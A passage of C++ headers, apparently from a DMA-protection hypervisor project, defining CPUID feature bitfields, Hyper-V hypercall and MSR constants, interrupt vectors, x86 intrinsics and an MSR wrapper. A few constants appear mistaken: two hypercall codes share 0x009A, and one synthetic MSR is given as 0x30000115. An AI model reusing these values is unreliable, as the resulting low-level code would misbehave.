    unsigned int ClflushLineSize : 8; // Value * 8 = cache line size in bytes
    unsigned int LogicalProcessorCount : 8; // Valid only if CPUID.1.EDX.HTT == 1
    unsigned int InitialApicId : 8;

    // ECX:
    unsigned int SSE3 : 1;
    unsigned int PCLMULQDQ : 1;
    unsigned int DTES64 : 1; // 64-bit DS area
    unsigned int MONITOR : 1;
    unsigned int DS_CPL : 1; // CPL qualified debug store
    unsigned int VMX : 1;
    unsigned int SMX : 1;
    unsigned int EIST : 1; // Enhanced Intel Speed-Step
    unsigned int TM2 : 1; // Thermal monitor 2
    unsigned int SSSE3 : 1;
    unsigned int CNXT_ID : 1; // L1 context ID
    unsigned int SDBG : 1; // Support of IA32_DEBUG_INTERFACE MSR
    unsigned int FMA : 1;
    unsigned int CMPXCHG16B : 1;
    unsigned int xTPRUpdateControl : 1; // Support of IA32_MISC_ENABLE changing
    unsigned int PDCM : 1; // Perfmon and debug capability: support of MSR IA32_PERF_CAPABILITIES
    unsigned int : 1;
    unsigned int PCID : 1; // Process-context identifiers: support of setting the CR4.PCIDE to 1
    unsigned int DSA : 1; // Ability to prefetch data from a memory mapped device
    unsigned int SSE41 : 1;
    unsigned int SSE42 : 1;
    unsigned int x2APIC : 1; // Support of x2APIC feature
    unsigned int MOVBE : 1;
    unsigned int POPCNT : 1;
    unsigned int TSCDeadline : 1; // Indicates that the processor's local APIC timer supports one-shot operation using a TSC deadline value
    unsigned int AESNI : 1;
    unsigned int XSAVE : 1;
    unsigned int OSXSAVE : 1;
    unsigned int AVX : 1;
    unsigned int F16C : 1;
    unsigned int RDRAND : 1;
    unsigned int NotUsed : 1; // Always returns 0

    // EDX:
    unsigned int FPU : 1;
    unsigned int VME : 1; // Virtual 8086-mode enhancements (including CR4.VME, CR4.PVI, EFLAGS.VIF and EFLAGS.VIP, etc.)
    unsigned int DE : 1; // Debugging extensions
    unsigned int PSE : 1; // Page size extension
    unsigned int TSC : 1; // Time stamp counter
    unsigned int MSR : 1; // RDMSR/WRMSR support
    unsigned int PAE : 1; // Physical address extensions support
    unsigned int MCE : 1; // Machine check exception
    unsigned int CX8 : 1; // CMPXCHG8B
    unsigned int APIC : 1;
    unsigned int : 1;
    unsigned int SEP : 1; // SYSENTER/SYSEXIT instructions support
    unsigned int MTRR : 1; // Memory-Type Range Registers support
    unsigned int PGE : 1; // Page global bit (CR4.PGE bit controls this feature)
    unsigned int MCA : 1; // Machine check architecture
    unsigned int CMOV : 1; // Conditional move instruction support
    unsigned int PAT : 1; // Page attribute table
    unsigned int PSE36 : 1; // 36-bit page size extension
    unsigned int PSN : 1; // Support of 96-bit processor serial number
    unsigned int CLFSH : 1; // CLFLUSH instruction support
    unsigned int : 1;
    unsigned int DS : 1; // Debug store
    unsigned int ACPI : 1; // Thermal Monitor and Software Controlled Clock Facilities
    unsigned int MMX : 1;
    unsigned int FXSR : 1; // FXSAVE and FXRSTOR support
    unsigned int SSE : 1;
    unsigned int SSE2 : 1;
    unsigned int SS : 1; // Self-snoop
    unsigned int HTT : 1; // Max APIC IDs reserved field is Valid (CPUID.1.EBX.LogicalProcessorCount is valid)
    unsigned int TM : 1; // Thermal monitor
    unsigned int : 1;
    unsigned int PBE : 1; // Pending break enable
};

struct ExtendedFeatureInformation
{
    // EAX:
    unsigned int Stepping : 4;
    unsigned int Model : 4;
    unsigned int FamilyId : 4;
    unsigned int : 4;
    unsigned int ExtendedModelId : 4;
    unsigned int ExtendedFamilyId : 8;
    unsigned int : 4;

    // EBX:
    unsigned int : 32;

    // ECX:
    unsigned int LahfSahf : 1;
    unsigned int : 4;
    unsigned int LZCNT : 1;
    unsigned int : 2;
    unsigned int PREFETCHW : 1;
    unsigned int : 23;

    // EDX:
    unsigned int : 11;
    unsigned int SysCallSysRet : 1;
    unsigned int : 8;
    unsigned int NX : 1;
    unsigned int : 5;
    unsigned int Page1Gb : 1; // 1-Gb large page support
    unsigned int RdtscpIa32TscAux : 1;
    unsigned int : 1;
    unsigned int IA64 : 1; // Intel64 Architecture support
    unsigned int : 2;
};



} // namespace Layout



struct MaximumFunctionNumberAndVendorId
    : public Generic::Layout::MaximumFunctionNumberAndVendorId
    , public CpuidRequest<IntelLeaf::MaximumFunctionNumberAndVendorId>
{
};

struct FeatureInformation
    : public Layout::FeatureInformation
    , public CpuidRequest<IntelLeaf::FeatureInformation>
{
};

struct ExtendedFeatureInformation
    : public Layout::ExtendedFeatureInformation
    , public CpuidRequest<IntelLeaf::ExtendedFeatureInformation>
{
};

struct ProcessorBrandString0
    : public Generic::Layout::ProcessorBrandString0
    , public CpuidRequest<IntelLeaf::ProcessorBrandString0>
{
};

struct ProcessorBrandString1
    : public Generic::Layout::ProcessorBrandString1
    , public CpuidRequest<IntelLeaf::ProcessorBrandString1>
{
};

struct ProcessorBrandString2
    : public Generic::Layout::ProcessorBrandString2
    , public CpuidRequest<IntelLeaf::ProcessorBrandString2>
{
};



} // namespace Intel



namespace Amd
{



// EAX values:
enum class AmdLeaf : unsigned long
{
    // Standard CPUID functions:
    MaximumFunctionNumberAndVendorId = 0x00000000,
    FeatureInformation = 0x00000001,
    // 0x00000002..0x00000004 are reserved
    MonitorMwaitParameters = 0x00000005,
    ThermalPowerManagement = 0x00000006,
    StructuredExtendedFeatureEnumeration = 0x00000007,
    // 0x00000008..0x0000000C are reserved
    ProcessorExtendedStateEnumeration = 0x0000000C,
    // 0x40000000..0x400000FF are reserved for hypervisor use

    // Extended CPUID functions:
    MaximumExtendedFunctionNumberAndVendorId = 0x80000000,
    ExtendedFeatureInformation = 0x80000001,
    ProcessorBrandString0 = 0x80000002,
    ProcessorBrandString1 = 0x80000003,
    ProcessorBrandString2 = 0x80000004,
    L1AndTlb = 0x80000005,
    L2L3Tlb = 0x80000006,
    PowerManagementAndRasCapabilities = 0x80000007,
    CapacityAndExtendedFeatures = 0x80000008,
    // 0x80000009 is reserved
    SvmFeatures = 0x8000000A,
    // 0x8000000B..0x80000018 are reserved
    TlbCharacteristicsFor1GbPages = 0x80000019,
    InstructionOptimizations = 0x8000001A,
    InstructionBasedSamplingCapabilities = 0x8000001B,
    LightweightProfilingCapabilities = 0x8000001C,
    CacheTopologyInformation = 0x8000001D,
    ProcessorTopologyInformation = 0x8000001E,
    EncryptedMemoryCapabilities = 0x8000001F
};



namespace Layout
{



struct ExtendedFeatureInformation
{
    // EAX:
    unsigned int Stepping : 4;
    unsigned int Model : 4;
    unsigned int FamilyId : 4;
    unsigned int : 4;
    unsigned int ExtendedModelId : 4;
    unsigned int ExtendedFamilyId : 8;
    unsigned int : 4;

    // EBX:
    unsigned int BrandId : 16;
    unsigned int : 12;
    unsigned int PkgType : 4;

    // ECX:
    unsigned int LahfSahf : 1;
    unsigned int CmpLegacy : 1; // Core multiprocessing legacy mode
    unsigned int SVM : 1; // Secure virtual machine
    unsigned int ExtApicSpace : 1;
    unsigned int AltMovCr8 : 1; // "lock mov cr0" means "mov cr8"
    unsigned int ABM : 1; // Advanced bit manipulation
    unsigned int SSE4A : 1; // EXTRQ, INSERTQ, MOVNTSS, and MOVNTSD instruction support
    unsigned int MisAlignSse : 1; // Misaligned SSE mode
    unsigned int _3DNowPrefetch : 1; // PREFETCH and PREFETCHW instruction support
    unsigned int OSVW : 1; // OS visible workaround
    unsigned int IBS : 1; // Instruction based sampling
    unsigned int XOP : 1; // Extended operation support
    unsigned int SKINIT : 1; // SKINIT and STGI are supported, independent of the value of MSRC000_0080[SVME]
    unsigned int WDT : 1; // Watchdog time support
    unsigned int : 1;
    unsigned int LWP : 1; // Lightweight profiling support
    unsigned int FMA4 : 1;
    unsigned int : 1;
    unsigned int : 1;
    unsigned int NodeId : 1;
    unsigned int : 1;
    unsigned int TBM : 1; // Trailing bit manipulation instruction support
    unsigned int TopologyExtension : 1;
    unsigned int : 9;

    // EDX:
    unsigned int FPU : 1;
    unsigned int VME : 1; // Virtual 8086-mode enhancements (including CR4.VME, CR4.PVI, EFLAGS.VIF and EFLAGS.VIP, etc.)
    unsigned int DE : 1; // Debugging extensions
    unsigned int PSE : 1; // Page size extension
    unsigned int TSC : 1; // Time stamp counter
    unsigned int MSR : 1; // RDMSR/WRMSR support
    unsigned int PAE : 1; // Physical address extensions support
    unsigned int MCE : 1; // Machine check exception
    unsigned int CMPXCHG8B : 1;
    unsigned int APIC : 1;
    unsigned int : 1;
    unsigned int SysCallSysRet : 1; // SYSCALL/SYSRET instructions support
    unsigned int MTRR : 1; // Memory-Type Range Registers support
    unsigned int PGE : 1; // Page global bit (CR4.PGE bit controls this feature)
    unsigned int MCA : 1; // Machine check architecture
    unsigned int CMOV : 1; // Conditional move instruction support
    unsigned int PAT : 1; // Page attribute table
    unsigned int PSE36 : 1; // 36-bit page size extension
    unsigned int : 2;
    unsigned int NX : 1; // No-execute page protection
    unsigned int : 1;
    unsigned int MmxExt : 1;
    unsigned int MMX : 1;
    unsigned int FXSR : 1; // FXSAVE and FXRSTOR support
    unsigned int FFXSR : 1;  // FXSAVE and FXRSTOR instruction optimizations
    unsigned int Page1Gb : 1; // 1-Gb large page support
    unsigned int RDTSCP : 1;
    unsigned int : 1;
    unsigned int LM : 1; // Long-mode
    unsigned int _3DNowExt : 1;
    unsigned int _3DNow : 1;
};

struct SvmFeatures
{
    unsigned int : 32; // EAX
    unsigned int : 32; // EBX
    unsigned int : 32; // ECX

    // EDX:
    unsigned int NestedPaging : 1;
    unsigned int LbrVirt : 1;
    unsigned int SVML : 1; // SVM Lock
    unsigned int NRIPS : 1; // NRIP Save
    unsigned int TscRateMsr : 1;
    unsigned int VmcbClean : 1;
    unsigned int FlushByAcid : 1;
    unsigned int DecodeAssists : 1;
    unsigned int : 1;
    unsigned int : 1;
    unsigned int PauseFilter : 1; // Pause intercept filter
    unsigned int : 1;
    unsigned int PauseFilterThreshold : 1;
    unsigned int : 19;
};



} // namespace Layout



struct MaximumFunctionNumberAndVendorId
    : public Generic::Layout::MaximumFunctionNumberAndVendorId
    , public CpuidRequest<AmdLeaf::MaximumFunctionNumberAndVendorId>
{
};

struct FeatureInformation
    : public Generic::Layout::FeatureInformation
    , public CpuidRequest<AmdLeaf::FeatureInformation>
{
};

struct ExtendedFeatureInformation
    : public Layout::ExtendedFeatureInformation
    , public CpuidRequest<AmdLeaf::ExtendedFeatureInformation>
{
};

struct ProcessorBrandString0
    : public Generic::Layout::ProcessorBrandString0
    , public CpuidRequest<AmdLeaf::ProcessorBrandString0>
{
};

struct ProcessorBrandString1
    : public Generic::Layout::ProcessorBrandString1
    , public CpuidRequest<AmdLeaf::ProcessorBrandString1>
{
};

struct ProcessorBrandString2
    : public Generic::Layout::ProcessorBrandString2
    , public CpuidRequest<AmdLeaf::ProcessorBrandString2>
{
};

struct SvmFeatures
    : public Layout::SvmFeatures
    , public CpuidRequest<AmdLeaf::SvmFeatures>
{
};



} // namespace Amd



} // namespace Cpuid

#pragma pack(pop)
```

`DmaProtect/include/Arch/Hyper-V.h`:

```h
#pragma once

// Hyper-V conformance requirements:
// https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/reference/tlfs

namespace HyperV
{
    // Version 6.0b (Feb. 2020)

    union HypercallInputValue
    {
        unsigned long long val;
        struct
        {
            unsigned long long CallCode : 16; // HypercallCode
            unsigned long long Fast : 1;
            unsigned long long VariableHeaderSize : 9;
            unsigned long long IsNested : 1;
            unsigned long long : 5;
            unsigned long long RepCount : 12;
            unsigned long long : 4;
            unsigned long long RepStartIndex : 12;
            unsigned long long : 4;
        } layout;
    };
    static_assert(sizeof(HypercallInputValue) == sizeof(unsigned long long));

    union HypercallResultValue
    {
        unsigned long long val;
        struct
        {
            unsigned long long Result : 16; // HvStatus
            unsigned long long : 16;
            unsigned long long RepsComplete : 12;
            unsigned long long : 20;
        } layout;
    };
    static_assert(sizeof(HypercallResultValue) == sizeof(unsigned long long));

    enum class HypercallCode
    {
        HvSwitchVirtualAddressSpace = 0x0001,
        HvFlushVirtualAddressSpace = 0x0002,
        HvFlushVirtualAddressList = 0x0003,
        HvGetLogicalProcessorRunTime = 0x0004,
        // 0x0005..0x0007 are reserved
        HvCallNotifyLongSpinWait = 0x0008,
        HvCallParkedVirtualProcessors = 0x0009,
        HvCallSyntheticClusterIpi = 0x000B,
        HvCallModifyVtlProtectionMask = 0x000C,
        HvCallEnablePartitionVtl = 0x000D,
        HvCallDisablePartitionVtl = 0x000E,
        HvCallEnableVpVtl = 0x000F,
        HvCallDisableVpVtl = 0x0010,
        HvCallVtlCall = 0x0011,
        HvCallVtlReturn = 0x0012,
        HvCallFlushVirtualAddressSpaceEx = 0x0013,
        HvCallFlushVirtualAddressListEx = 0x0014,
        HvCallSendSyntheticClusterIpiEx = 0x0015,
        // 0x0016..0x003F are reserved
        HvCreatePartition = 0x0040,
        HvInitializePartition = 0x0041,
        HvFinalizePartition = 0x0042,
        HvDeletePartition = 0x0043,
        HvGetPartitionProperty = 0x0044,
        HvSetPartitionProperty = 0x0045,
        HvGetPartitionId = 0x0046,
        HvGetNextChildPartition = 0x0047,
        HvDepositMemory = 0x0048,
        HvWithdrawMemory = 0x0049,
        HvGetMemoryBalance = 0x004A,
        HvMapGpaPages = 0x004B,
        HvUnmapGpaPages = 0x004C,
        HvInstallIntercept = 0x004D,
        HvCreateVp = 0x004E,
        HvDeleteVp = 0x004F,
        HvGetVpRegisters = 0x0050,
        HvSetVpRegisters = 0x0051,
        HvTranslateVirtualAddress = 0x0052,
        HvReadGpa = 0x0053,
        HvWriteGpa = 0x0054,
        // 0x0055 is deprecated
        HvClearVirtualInterrupt = 0x0056,
        // 0x0057 is deprecated
        HvDeletePort = 0x0058,
        HvConnectPort = 0x0059,
        HvGetPortProperty = 0x005A,
        HvDisconnectPort = 0x005B,
        HvPostMessage = 0x005C,
        HvSignalEvent = 0x005D,
        HvSavePartitionState = 0x005E,
        HvRestorePartitionState = 0x005F,
        HvInitializeEventLogBufferGroup = 0x0060,
        HvFinalizeEventLogBufferGroup = 0x0061,
        HvCreateEventLogBuffer = 0x0062,
        HvDeleteEventLogBuffer = 0x0063,
        HvMapEventLogBuffer = 0x0064,
        HvUnmapEventLogBuffer = 0x0065,
        HvSetEventLogGroupSources = 0x0066,
        HvReleaseEventLogBuffer = 0x0067,
        HvFlushEventLogBuffer = 0x0068,
        HvPostDebugData = 0x0069,
        HvRetrieveDebugData = 0x006A,
        HvResetDebugSession = 0x006B,
        HvMapStatsPage = 0x006C,
        HvUnmapStatsPage = 0x006D,
        HvCallMapSparseGpaPages = 0x006E,
        HvCallSetSystemProperty = 0x006F,
        HvCallSetPortProperty = 0x0070,
        // 0x0071..0x0075 are reserved
        HvCallAddLogicalProcessor = 0x0076,
        HvCallRemoveLogicalProcessor = 0x0077,
        HvCallQueryNumaDistance = 0x0078,
        HvCallSetLogicalProcessorProperty = 0x0079,
        HvCallGetLogicalProcessorProperty = 0x007A,
        HvCallGetSystemProperty = 0x007B,
        HvCallMapDeviceInterrupt = 0x007C,
        HvCallUnmapDeviceInterrupt = 0x007D,
        HvCallRetargetDeviceInterrupt = 0x007E,
        // 0x007F is reserved
        HvCallMapDevicePages = 0x0080,
        HvCallUnmapDevicePages = 0x0081,
        HvCallAttachDevice = 0x0082,
        HvCallDetachDevice = 0x0083,
        HvCallNotifyStandbyTransition = 0x0084,
        HvCallPrepareForSleep = 0x0085,
        HvCallPrepareForHibernate = 0x0086,
        HvCallNotifyPartitionEvent = 0x0087,
        HvCallGetLogicalProcessorRegisters = 0x0088,
        HvCallSetLogicalProcessorRegisters = 0x0089,
        HvCallQueryAssotiatedLpsforMca = 0x008A,
        HvCallNotifyRingEmpty = 0x008B,
        HvCallInjectSyntheticMachineCheck = 0x008C,
        HvCallScrubPartition = 0x008D,
        HvCallCollectLivedump = 0x008E,
        HvCallDisableHypervisor = 0x008F,
        HvCallModifySparseGpaPages = 0x0090,
        HvCallRegisterInterceptResult = 0x0091,
        HvCallUnregisterInterceptResult = 0x0092,
        HvCallAssertVirtualInterrupt = 0x0094,
        HvCallCreatePort = 0x0095,
        HvCallConnectPort = 0x0096,
        HvCallGetSpaPageList = 0x0097,
        // 0x0098 is reserved
        HvCallStartVirtualProcessor = 0x009A,
        HvCallGetVpIndexFromApicId = 0x009A,
        // 0x009A..0x00AE are reserved
        HvCallFlushGuestPhysicalAddressSpace = 0x00AF,
        HvCallFlushGuestPhysicalAddressList = 0x00B0
    };

    enum class HvStatus
    {
        HV_STATUS_SUCCESS = 0x0000,
        // 0x0001 is reserved
        HV_STATUS_INVALID_HYPERCALL_CODE = 0x0002,
        HV_STATUS_INVALID_HYPERCALL_INPUT = 0x0003,
        HV_STATUS_INVALID_ALIGNMENT = 0x0004,
        HV_STATUS_INVALID_PARAMETER = 0x0005,
        HV_STATUS_ACCESS_DENIED = 0x0006,
        HV_STATUS_INVALID_PARTITION_STATE = 0x0007,
        HV_STATUS_OPERATION_DENIED = 0x0008,
        HV_STATUS_UNKNOWN_PROPERTY = 0x0009,
        HV_STATUS_PROPERTY_VALUE_OUT_OF_RANGE = 0x000A,
        HV_STATUS_INSUFFICIENT_MEMORY = 0x000B,
        HV_STATUS_PARTITION_TOO_DEEP = 0x000C,
        HV_STATUS_INVALID_PARTITION_ID = 0x000D,
        HV_STATUS_INVALID_VP_INDEX = 0x000E,
        // 0x000F..0x0010 are reserved
        HV_STATUS_INVALID_PORT_ID = 0x0011,
        HV_STATUS_INVALID_CONNECTION_ID = 0x0012,
        HV_STATUS_INSUFFICIENT_BUFFERS = 0x0013,
        HV_STATUS_NOT_ACKNOWLEDGED = 0x0014,
        HV_STATUS_INVALID_VP_STATE = 0x0015,
        HV_STATUS_ACKNOWLEDGED = 0x0016,
        HV_STATUS_INVALID_SAVE_REStORE_STATE = 0x0017,
        HV_STATUS_INVALID_SYNIC_STATE = 0x0018,
        HV_STATUS_OBJECT_IN_USE = 0x0019,
        HV_STATUS_INVALID_PROXIMITY_DOMAIN_INFO = 0x001A,
        HV_STATUS_NO_DATA = 0x001B,
        HV_STATUS_INACTIVE = 0x001C,
        HV_STATUS_NO_RESOURCES = 0x001D,
        HV_STATUS_FEATURE_UNAVAILABLE = 0x001E,
        HV_STATUS_PARTIAL_PACKET = 0x001F,
        HV_STATUS_PROCESSOR_FEATURE_NOT_SUPPORTED = 0x0020,
        HV_STATUS_PROCESSOR_CACHE_LINE_FLUSH_SIZE_INCOMPATIBLE = 0x0030,
        HV_STATUS_INSUFFICIENT_BUFFER = 0x0033,
        HV_STATUS_INCOMPATIBLE_PROCESSOR = 0x0037,
        HV_STATUS_INSUFFICIENT_DEVICE_DOMAINS = 0x0038,
        HV_STATUS_CPUID_FEATURE_VALIDATION_ERROR = 0x003C,
        HV_STATUS_CPUID_XSAVE_FEATURE_VALIDATION_ERROR = 0x003D,
        HV_STATUS_PROCESSOR_STARTUP_TIMEOUT = 0x003E,
        HV_STATUS_SMX_ENABLED = 0x003F,
        HV_STATUS_INVALID_LP_INDEX = 0x0041,
        HV_STATUS_INVALID_REGISTER_VALUE = 0x0050,
        HV_STATUS_NX_NOT_DETECTED = 0x0055,
        HV_STATUS_INVALID_DEVICE_ID = 0x0057,
        HV_STATUS_INVALID_DEVICE_STATE = 0x0058,
        HV_STATUS_PENDING_PAGE_REQUESTS = 0x0059,
        HV_STATUS_PAGE_REQUEST_INVALID = 0x0060,
        HV_STATUS_OPERATION_FAILED = 0x0071,
        HV_STATUS_NOT_ALLOWED_WITH_NESTED_VIRT_ACTIVE = 0x0072,
    };

    enum class Cpuid
    {
        MAX_LEAF_NUMBER_AND_VENDOR_ID = 0x40000000,
        INTERFACE_SIGNATURE = 0x40000001,
        SYSTEM_IDENTITY = 0x40000002,
        FEATURE_IDENTIFICATION = 0x40000003,
        IMPLEMENTATION_RECOMMENDATIONS = 0x40000004,
        IMPLEMENTATION_LIMITS = 0x40000005,
        IMPLEMENTATION_HARDWARE_FEATURES = 0x40000006,
        CPU_MANAGEMENT_FEATURES = 0x40000007,
        SVM_FEATURES = 0x40000008,
        NESTED_HYPERVISOR_FEATURE_IDENTIFICATION = 0x40000009,
        NESTED_VIRTUALIZATION_FEATURES = 0x4000000A,
    };

    enum class HypervisorSyntheticMsrs
    {
        HV_X64_MSR_GUEST_OS_ID = 0x40000000,
        HV_X64_MSR_HYPERCALL   = 0x40000001,
        HV_X64_MSR_VP_INDEX    = 0x40000002,
        HV_X64_MSR_RESET = 0x40000003,
        HV_X64_MSR_VP_RUNTIME = 0x40000010,
        HV_X64_MSR_TIME_REF_COUNT = 0x40000020,
        HV_X64_MSR_REFERENCE_TSC = 0x40000021,
        HV_X64_MSR_TSC_FREQUENCY = 0x40000022,
        HV_X64_MSR_APIC_FREQUENCY = 0x40000023,
        HV_X64_MSR_NPIEP_CONFIG = 0x40000040,
        HV_X64_MSR_EOI = 0x40000070,
        HV_X64_MSR_ICR = 0x40000071,
        HV_X64_MSR_TPR = 0x40000072,
        HV_X64_MSR_VP_ASSIST_PAGE = 0x40000073,
        HV_X64_MSR_SCONTROL = 0x40000080,
        HV_X64_MSR_SVERSION = 0x40000081,
        HV_X64_MSR_SIEFP = 0x40000082,
        HV_X64_MSR_SIMP = 0x40000083,
        HV_X64_MSR_EOM = 0x40000084,
        HV_X64_MSR_SINT0 = 0x40000090,
        HV_X64_MSR_SINT1 = 0x40000091,
        HV_X64_MSR_SINT2 = 0x40000092,
        HV_X64_MSR_SINT3 = 0x40000093,
        HV_X64_MSR_SINT4 = 0x40000094,
        HV_X64_MSR_SINT5 = 0x40000095,
        HV_X64_MSR_SINT6 = 0x40000096,
        HV_X64_MSR_SINT7 = 0x40000097,
        HV_X64_MSR_SINT8 = 0x40000098,
        HV_X64_MSR_SINT9 = 0x40000099,
        HV_X64_MSR_SINT10 = 0x4000009A,
        HV_X64_MSR_SINT11 = 0x4000009B,
        HV_X64_MSR_SINT12 = 0x4000009C,
        HV_X64_MSR_SINT13 = 0x4000009D,
        HV_X64_MSR_SINT14 = 0x4000009E,
        HV_X64_MSR_SINT15 = 0x4000009F,
        HV_X64_MSR_STIMER0_CONFIG = 0x400000B0,
        HV_X64_MSR_STIMER0_COUNT = 0x400000B1,
        HV_X64_MSR_STIMER1_CONFIG = 0x400000B2,
        HV_X64_MSR_STIMER1_COUNT = 0x400000B3,
        HV_X64_MSR_STIMER2_CONFIG = 0x400000B4,
        HV_X64_MSR_STIMER2_COUNT = 0x400000B5,
        HV_X64_MSR_STIMER3_CONFIG = 0x400000B6,
        HV_X64_MSR_STIMER3_COUNT = 0x400000B7,
        HV_X64_MSR_GUEST_IDLE = 0x400000F0,
        HV_X64_MSR_CRASH_P0 = 0x40000100,
        HV_X64_MSR_CRASH_P1 = 0x40000101,
        HV_X64_MSR_CRASH_P2 = 0x40000102,
        HV_X64_MSR_CRASH_P3 = 0x40000103,
        HV_X64_MSR_CRASH_P4 = 0x40000104,
        HV_X64_MSR_CRASH_CTL = 0x40000105,
        HV_X64_MSR_REENLIGHTENMENT_CONTROL = 0x40000106,
        HV_X64_MSR_TSC_EMULATION_CONTROL = 0x40000107,
        HV_X64_MSR_TSC_EMULATION_STATUS = 0x40000108,
        HV_X64_MSR_STIME_UNHALTED_TIMER_CONFIG = 0x40000114,
        HV_X64_MSR_STIME_UNHALTED_TIMER_COUNT = 0x30000115,
        HV_X64_MSR_NESTED_VP_INDEX = 0x40001002,
        HV_X64_MSR_NESTED_SCONTROL = 0x40001080,
        HV_X64_MSR_NESTED_SVERSION = 0x40001081,
        HV_X64_MSR_NESTED_SIEFP = 0x40001082,
        HV_X64_MSR_NESTED_SIMP = 0x40001083,
        HV_X64_MSR_NESTED_EOM = 0x40001084,
        HV_X64_MSR_NESTED_SINT0 = 0x40001090,
        HV_X64_MSR_NESTED_SINT1 = 0x40001091,
        HV_X64_MSR_NESTED_SINT2 = 0x40001092,
        HV_X64_MSR_NESTED_SINT3 = 0x40001093,
        HV_X64_MSR_NESTED_SINT4 = 0x40001094,
        HV_X64_MSR_NESTED_SINT5 = 0x40001095,
        HV_X64_MSR_NESTED_SINT6 = 0x40001096,
        HV_X64_MSR_NESTED_SINT7 = 0x40001097,
        HV_X64_MSR_NESTED_SINT8 = 0x40001098,
        HV_X64_MSR_NESTED_SINT9 = 0x40001099,
        HV_X64_MSR_NESTED_SINT10 = 0x4000109A,
        HV_X64_MSR_NESTED_SINT11 = 0x4000109B,
        HV_X64_MSR_NESTED_SINT12 = 0x4000109C,
        HV_X64_MSR_NESTED_SINT13 = 0x4000109D,
        HV_X64_MSR_NESTED_SINT14 = 0x4000109E,
        HV_X64_MSR_NESTED_SINT15 = 0x4000109F,
    };
}
```

`DmaProtect/include/Arch/Interrupts.h`:

```h
#pragma once

enum class InterruptVector : int
{
    DivideError = 0,                 // #DE, DIV and IDIV instructions
    Debug = 1,                       // #DB, any code or data reference
    NmiInterrupt = 2,                //      Non-maskable interrupt
    Breakpoint = 3,                  // #BP, INT3 instruction
    Overflow = 4,                    // #OF, INT0 instruction
    BoundRangeExceeded = 5,          // #BR, BOUND instruction
    InvalidOpcode = 6,               // #UD, UD instruction or reserved opcode
    DeviceNotAvailable = 7,          // #NM, No math coprocoessor (floating point or WAIT/FWAIT instruction)
    DoubleFault = 8,                 // #DF, Any instruction that can generate an exception, an NMI or an INTR
    CoProcessorSegmentOverrun = 9,   // #MF, Floating-point instruction
    InvalidTss = 10,                 // #TS, Task switch or TSS access
    SegmentNotPresent = 11,          // #NP, Loading segment register or accessing system segments
    StackSegmentFault = 12,          // #SS, Stack operations and SS register loads
    GeneralProtection = 13,          // #GP, Any memory reference and other protection checks
    PageFault = 14,                  // #PF, Any memory reference
    Reserved = 15,
    FloatingPointError = 16,         // #MF, Floating-point or WAIT/FWAIT instruction
    AlignmentCheck = 17,             // #AC, Any data reference in memory
    MachineCheck = 18,               // #MC, Error codes (if any) and source are model-dependent
    SimdFloatingPointException = 19, // #XM, SIMD floating-point instruction
    VirtualizationException = 20,    // #VE, EPT violations
    ControlProtectionException = 21, // #CP, The RET, IRET, RSTORSSP, SETSSBSY, and ENDBRANCH (whet CET is enabled) instructions
    // 22..31 are reserved
    // 32..255 are maskable interrupts (external interrupt from INTR pin or INTn instruction
};
```

`DmaProtect/include/Arch/Intrinsics.h`:

```h
#pragma once

#include <immintrin.h>

#ifdef __cplusplus
extern "C"
{
#endif

#if _WIN64 || __x86_64__
    typedef unsigned long long reg_t;
#else
    typedef unsigned long reg_t;
#endif

void __cpuid(int[4], int);
void __cpuidex(int[4], int, int);

void __int2c(void);

unsigned char __inbyte(unsigned short);
unsigned short __inword(unsigned short);
unsigned long __indword(unsigned short);
void __inbytestring(unsigned short, unsigned char*, unsigned long);
void __inwordstring(unsigned short, unsigned short*, unsigned long);
void __indwordstring(unsigned short, unsigned long*, unsigned long);

void __outbyte(unsigned short, unsigned char);
void __outword(unsigned short, unsigned short);
void __outdword(unsigned short, unsigned long);
void __outbytestring(unsigned short, unsigned char*, unsigned long);
void __outwordstring(unsigned short, unsigned short*, unsigned long);
void __outdwordstring(unsigned short, unsigned long*, unsigned long);

void __lidt(void*);
void __sidt(void*);

void _lgdt(void*);
void _sgdt(void*);

unsigned long long __rdtsc(void);
unsigned long long __rdtscp(unsigned int*);

reg_t __readcr0(void);
reg_t __readcr2(void);
reg_t __readcr3(void);
reg_t __readcr4(void);
reg_t __readcr8(void);

void __writecr0(size_t);
void __writecr2(size_t);
void __writecr3(size_t);
void __writecr4(size_t);
void __writecr8(size_t);

size_t __readdr(unsigned int);
void __writedr(unsigned int, size_t);

size_t __readeflags(void);
void __writeeflags(size_t);

unsigned long long __readmsr(unsigned long);
void __writemsr(unsigned long, unsigned long long);

unsigned long long __readpmc(unsigned long);

unsigned long __segmentlimit(unsigned long);

void __invlpg(void*);
void __wbinvd(void);

void __cdecl _disable(void);
void __cdecl _enable(void);

void _rsm(void);

void __halt(void);

void __cdecl __debugbreak(void);
__declspec(noreturn) void __fastfail(unsigned int);

void __svm_clgi(void);
void __svm_invlpga(void*, int);
void __svm_skinit(int);
void __svm_stgi(void);
void __svm_vmload(size_t);
void __svm_vmrun(size_t);
void __svm_vmsave(size_t);
void __svm_invlpgb(void*, int);
void __svm_tlbsync(void);

void __vmx_off(void);
unsigned char __vmx_on(unsigned long long*);
unsigned char __vmx_vmclear(unsigned long long*);
unsigned char __vmx_vmlaunch(void);
unsigned char __vmx_vmptrld(unsigned long long*);
void __vmx_vmptrst(unsigned long long*);
unsigned char __vmx_vmread(size_t, size_t*);
unsigned char __vmx_vmresume(void);
unsigned char __vmx_vmwrite(size_t, size_t);

void __ud2(void);
void __nop(void);

#ifdef __cplusplus
} // extern "C"
#endif
```

`DmaProtect/include/Arch/Msr.h`:

```h
#pragma once

extern "C" unsigned long long __readmsr(unsigned long index);
extern "C" void __writemsr(unsigned long index, unsigned long long value);

#pragma pack(push, 1)

namespace Msr
{



template <auto msr>
struct MsrAddress
{
    static constexpr auto k_msr = static_cast<unsigned int>(msr);
};



template <typename Layout>
union MsrLayout
{
    unsigned long long raw{};
    Layout layout;

    MsrLayout<Layout>& read() noexcept
    {
        raw = __readmsr(Layout::k_msr);
        return *this;
    }

    MsrLayout<Layout>& write() noexcept
    {
        __writemsr(Layout::k_msr, raw);
        return *this;
    }

    const Layout* operator -> () const noexcept
    {
        return &layout;
    }

    Layout* operator -> () noexcept
    {
        return &layout;
    }

    const Layout& operator * () const noexcept
    {
        return layout;
    }

    Layout& operator * () noexcept
    {
        return layout;
    }
};



struct Msr
{
    static unsigned long long read(unsigned int msr) noexcept
    {
        return __readmsr(msr);
    }

    void write(unsigned int msr, unsigned long long value) noexcept
    {
        __writemsr(msr, value);
    }

    template <typename Layout>
    static MsrLayout<Layout> read() noexcept
    {
        MsrLayout<Layout> msr;
